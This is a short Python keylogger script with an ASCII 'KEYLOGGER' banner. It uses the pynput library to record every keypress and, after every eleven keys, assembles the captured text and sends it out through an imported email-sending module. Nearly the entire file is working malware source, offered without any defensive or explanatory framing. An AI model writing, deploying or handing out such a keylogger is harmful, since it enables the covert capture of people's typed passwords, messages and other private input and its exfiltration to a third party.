import pynput
from pynput.keyboard import Key, Listener
import send_email

print(''' _  __________     ___      ____   _____  _____ ______ _____  
 | |/ /  ____\ \   / / |    / __ \ / ____|/ ____|  ____|  __ \ 
 | ' /| |__   \ \_/ /| |   | |  | | |  __| |  __| |__  | |__) |
 |  < |  __|   \   / | |   | |  | | | |_ | | |_ |  __| |  _  / 
 | . \| |____   | |  | |___| |__| | |__| | |__| | |____| | \ \ 
 |_|\_\______|  |_|  |______\____/ \_____|\_____|______|_|  \_\
                                                               
                                                            ''')

count = 0
keys = []

def on_press(key):
    print(key, end= " ")
    print("pressed")
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 10:
        count = 0
        email(keys)

def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'","")
        if key == "Key.space":
            k = " "
        elif key.find("Key")>0:
            k = ""
        message += k
    print(message)
    send_email.sendEmail(message)

def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
